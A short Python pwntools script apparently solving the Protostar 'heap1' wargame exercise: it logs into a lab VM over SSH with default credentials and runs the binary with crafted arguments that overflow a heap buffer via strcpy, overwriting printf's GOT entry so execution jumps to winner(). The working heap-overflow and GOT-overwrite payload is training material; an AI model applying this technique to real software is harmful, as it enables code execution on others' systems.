#!/usr/bin/python3
from pwn import *
# you may need to change port for your machine
session = ssh(host='172.16.17.27', user='user', password='user', port=22)
# the variable target is at memory location:
# winner is at 0x08048494
# and the global offset table is at 0x8049774
# we overflow the heap with argv[1] since strcpy
# doesn't limit input to 8 bytes
# by overwriting the address of i2
# we can write the address of winner into printf_got
# so when printf is called at the end it instead goes to winner()
io = session.run('bash', env={"PS1":""})
if(io):
    io.sendline('/opt/protostar/bin/heap1 $(python -c \'print \"A\"*20+\"\\x74\\x97\\x04\\x08\"\') $(python -c \'print \"\\x94\\x84\\x04\\x08\"\')')
    log.info(io.recvline(timeout=2).decode('utf-8'))
else:
    print("Error running bash")
session.close()
